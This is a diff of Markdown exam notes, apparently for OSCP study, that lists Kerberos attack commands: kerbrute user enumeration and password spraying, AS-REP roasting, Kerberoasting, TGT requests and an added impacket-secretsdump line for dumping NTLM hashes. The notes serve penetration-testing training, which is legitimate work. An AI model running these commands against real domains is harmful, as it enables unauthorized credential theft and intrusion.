@@ -2,44 +2,50 @@
 
 ## Service Usage
 
-*Rare on current OSCP (AD-only boxes). Keep this lean.*
-
-Validate users / AS-REP roast
+Rare on current OSCP (AD-only boxes). Keep this lean.
+Validate users via kerbrute
 ```bash
 kerbrute userenum -d $domain --dc $ip users.txt
+```
+Password spray via kerbrute
+```bash
 kerbrute passwordspray -d $domain --dc $ip users.txt 'Spring2026!'
 ```
-
-Get a TGT (if you have creds + a clock-synced box)
+Get a TGT if you have creds and a clock-synced box
 ```bash
 impacket-getTGT $domain/$un:$pw
 ```
 
 ## 0. Fast Path (try these first)
 
-User enumeration (no creds, works if pre-auth is off for some accounts):
+User enumeration (no creds, works if pre-auth is off)
 ```bash
 kerbrute userenum -d $domain --dc $ip users.txt
 ```
-
-AS-REP roast (harvest crackable hashes if pre-auth disabled):
+AS-REP roast (harvest crackable hashes if pre-auth disabled)
 ```bash
 impacket-GetNPUsers $domain/ -usersfile users.txt -dc-ip $ip -no-pass
 ```
 
 ## 1. Banner Grab & Unauthenticated Enumeration
 
-Port + service
+Port and service scan
 ```bash
 nmap -p 88 -sV -sC $ip
 ```
 
 ## 2. Authenticated Enumeration
 
-With valid creds:
+Kerberoast (request SPNs) with creds
 ```bash
-impacket-GetUserSPNs $domain/$un:$pw -dc-ip $ip       # kerberoast
-impacket-GetNPUsers $domain/$un:$pw -dc-ip $ip        # asrep-roast
+impacket-GetUserSPNs $domain/$un:$pw -dc-ip $ip
+```
+AS-REP roast with creds
+```bash
+impacket-GetNPUsers $domain/$un:$pw -dc-ip $ip
+```
+Dump secrets (NTLM hashes) with creds
+```bash
 impacket-secretsdump $domain/$un:$pw@$ip
 ```
 
